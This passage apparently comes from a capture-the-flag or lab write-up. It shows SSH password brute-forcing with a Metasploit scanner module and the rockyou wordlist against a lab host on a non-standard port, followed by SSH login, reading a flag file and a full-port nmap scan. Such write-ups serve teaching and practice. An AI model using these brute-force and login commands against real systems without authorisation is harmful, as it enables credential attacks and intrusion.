* Password: (discovered during brute force)

---

## Gaining Access

Connected to the system using SSH:

ssh george@192.168.219.201 -p 2222

After entering the password, access was granted.

---

## Post-Exploitation

Navigated to the user directory:

cd /home/george

Listed files:

ls

---

## Retrieving the Flag

Read the file containing the flag:

cat flag.txt

---

## Key Commands

msfconsole
use auxiliary/scanner/ssh/ssh_login
set RHOSTS 192.168.219.201
set RPORT 2222
set USERNAME george
set PASS_FILE /usr/share/wordlists/rockyou.txt
run
ssh george@192.168.219.201 -p 2222
cd /home/george
cat flag.txt

---

## Key Concepts

* Auxiliary modules are used for scanning and enumeration
* SSH brute force tests multiple password combinations
* Services may run on non-standard ports and should always be checked
* Credential discovery is a key step in gaining initial access

---

## Additional Note

During enumeration, always scan all ports to identify non-standard services:

nmap -p- 192.168.219.201

This can reveal services such as SSH running on uncommon ports.
